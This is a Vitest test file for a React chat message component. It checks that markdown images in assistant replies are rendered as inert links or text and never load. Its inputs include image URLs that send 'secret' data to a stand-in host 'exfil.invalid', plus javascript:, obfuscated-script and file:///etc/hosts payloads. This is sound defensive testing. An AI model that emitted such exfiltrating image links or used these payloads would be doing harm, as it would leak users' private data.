import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { randomUUID } from 'node:crypto';
import { Message } from '../../src/client/components/Message';
import type { SourceRecord, SearchRecord } from '../../src/shared/research';
import type { MessageDTO } from '../../src/shared/types';
const source: SourceRecord = { sourceId: randomUUID(), searchId: randomUUID(), n: 1, rank: 1, url: 'https://example.com/pricing', title: 'Price evidence', excerpt: 'Costs $90', publishedAt: null, retrievedAt: '2026-11-11T08:30:00Z', fixture: true };
const search: SearchRecord = { id: source.searchId, query: 'Example pricing', round: 1, freshness: 'any', startedAt: source.retrievedAt, durationMs: 1200, status: 'ok' };
const base: MessageDTO = { id: randomUUID(), role: 'assistant', content: '', status: 'complete', createdAt: '', localDate: '', seq: 2, replyTo: null,
  evidence: { searches: [search], sources: [source], citations: [{ marker: 1, sourceId: source.sourceId, state: 'verified', detail: null }] } };
// Only the answer prose is model-controlled; the research list above it is app-rendered.
const render = (content: string) => renderToStaticMarkup(createElement(Message, { message: { ...base, content } })).split('<div class="prose">')[1];
const fetches = (html: string) => /<img|\ssrc=|srcset|poster=|background/i.test(html);
describe('assistant markdown images never load', () => {
  it('turns an https image into a labelled, click-only link', () => {
    const html = render('![a](https://exfil.invalid/p.png?d=secret)');
    expect(fetches(html)).toBe(false);
    expect(html).toContain('class="blocked-image"'); expect(html).toContain('href="https://exfil.invalid/p.png?d=secret"');
    expect(html).toContain('rel="noopener noreferrer"'); expect(html).toMatch(/referrerpolicy="no-referrer"/i);
    expect(html).toContain('target="_blank"'); expect(html).toContain('Image not loaded: a');
  });
  it.each(['HTTP://exfil.invalid/p.png', 'http://exfil.invalid/p.png'])('handles scheme %s', url => {
    const html = render(`![a](${url})`);
    expect(fetches(html)).toBe(false); expect(html).toContain('class="blocked-image"');
  });
  it('handles reference-style, linked, table, list and blockquote images', () => {
    for (const md of ['![a][r]\n\n[r]: https://exfil.invalid/r.png', '[![a](https://exfil.invalid/i.png)](https://example.com)', '| h |\n|---|\n| ![a](https://exfil.invalid/t.png) |', '- ![a](https://exfil.invalid/l.png)', '> ![a](https://exfil.invalid/q.png)']) {
      const html = render(md);
      expect(fetches(html), md).toBe(false); expect(html, md).toContain('blocked-image');
    }
  });
  it.each(['data:image/png;base64,AAAA', 'javascript:alert(1)', 'file:///etc/hosts', 'blob:https://x/y', '/x.png', '//exfil.invalid/x.png', 'https://', 'jav&#x61;script:alert(1)', '#citation-1'])('renders %s as inert text', url => {
    const html = render(`![alt](${url})`);
    expect(fetches(html)).toBe(false); expect(html).not.toContain('<a class="blocked-image"');
    expect(html).toContain('<span class="blocked-image">Image removed: alt</span>');
    expect(html).not.toMatch(/href="(data|javascript|file|blob|\/|#citation-1")/);
  });
  it('escapes raw HTML and keeps code literal', () => {
    const raw = render('<img src="https://exfil.invalid/raw.png">');
    expect(raw).not.toContain('<img'); expect(raw).not.toContain('<a '); expect(raw).toContain('&lt;img');
    const code = render('`![a](https://exfil.invalid/c.png)`\n\n```\n![a](https://exfil.invalid/f.png)\n```');
    expect(fetches(code)).toBe(false); expect(code).not.toContain('blocked-image');
    expect(code).toContain('<code>![a](https://exfil.invalid/c.png)</code>'); expect(code).toContain('![a](https://exfil.invalid/f.png)');
  });
  it('never nests a link inside a linked image', () => {
    const html = render('[![nested](https://exfil.invalid/i.png)](https://example.com/page)');
    expect(html.match(/<a /g)).toHaveLength(1); expect(html).toContain('href="https://example.com/page"');
    expect(html).not.toContain('exfil.invalid'); expect(html).toContain('Image not loaded: nested');
  });
  it('never nests links or drops link text when an image sits deeper inside a link', () => {
    const wrapped = render('[**![x](https://exfil.invalid/i.png)**](https://example.com/page)');
    expect(wrapped.match(/<a /g)).toHaveLength(1); expect(wrapped).not.toContain('exfil.invalid'); expect(wrapped).toContain('Image not loaded: x');
    const mixed = render('[*see* ![x](https://exfil.invalid/i.png) here](https://example.com/page)');
    expect(mixed.match(/<a /g)).toHaveLength(1); expect(mixed).toContain('<em>see</em>'); expect(mixed).toContain(' here');
    expect(mixed).not.toContain('exfil.invalid'); expect(fetches(mixed)).toBe(false);
  });
  it('uses the hostname as the name when alt text is empty', () => {
    const html = render('![](https://exfil.invalid/p.png)');
    expect(html).toContain('Image not loaded: exfil.invalid'); expect(html).toContain('aria-label="Image not loaded: exfil.invalid.');
  });
  it('still renders ordinary links and citations', () => {
    const html = render('[docs](https://example.com/docs) costs $90 [1]');
    expect(html).toContain('<a href="https://example.com/docs"'); expect(html).toContain('noopener noreferrer');
    expect(html).toContain('class="citation-marker"'); expect(html).toContain('Price evidence'); expect(html).not.toContain('blocked-image');
  });
});
